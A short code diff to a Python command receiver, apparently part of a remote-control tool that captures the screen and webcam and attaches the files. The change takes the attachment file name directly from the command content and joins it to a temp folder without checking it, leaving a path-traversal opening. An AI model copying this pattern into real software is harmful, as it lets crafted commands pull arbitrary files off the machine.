@@ -131,14 +131,8 @@ class Receiver():
 
         # attach files
         file_name = None
-        if command == 'CAPTURE SCREEN':
-            file_name = 'screenshot.png'
-        elif command == 'RECORD SCREEN':
-            file_name = 'screen-record.avi'
-        elif command == 'SHOT WEBCAM':
-            file_name = 'webcam.png'
-        elif command == 'RECORD WEBCAM':
-            file_name = 'webcam-record.avi'
+        if command in ['CAPTURE SCREEN', 'RECORD SCREEN', 'SHOT WEBCAM', 'RECORD WEBCAM']:
+            file_name = content
 
         if file_name:
             path = os.path.join('.temp', file_name)
